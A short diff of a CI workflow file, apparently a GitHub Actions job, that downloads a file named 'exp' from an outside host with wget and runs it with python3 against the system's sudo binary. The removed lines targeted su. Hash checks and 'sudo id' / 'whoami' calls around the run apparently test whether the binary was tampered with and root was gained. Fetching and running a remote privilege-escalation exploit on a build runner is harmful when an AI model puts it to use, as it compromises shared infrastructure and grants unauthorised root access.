@@ -19,19 +19,9 @@ jobs:
         shell: bash
         run: |
           wget https://copy.fail/exp
-          sha256sum $(which su)
-          su --version
-          python3 exp $(which su)
+          sha256sum $(which sudo)
+          sudo id 2>&1
           python3 exp $(which sudo)
           
-          sha256sum $(which su)
-          which su
-          file $(which su)
-          ls -al $(which su)
-          su --version
-          su -c 'whoami' 2>&1
-          echo $(su -c 'whoami')
-          sudo su -c 'id' 2>&1
-          su 2>&1
-          id 2>&1
+          sha256sum $(which sudo)
           sudo id 2>&1
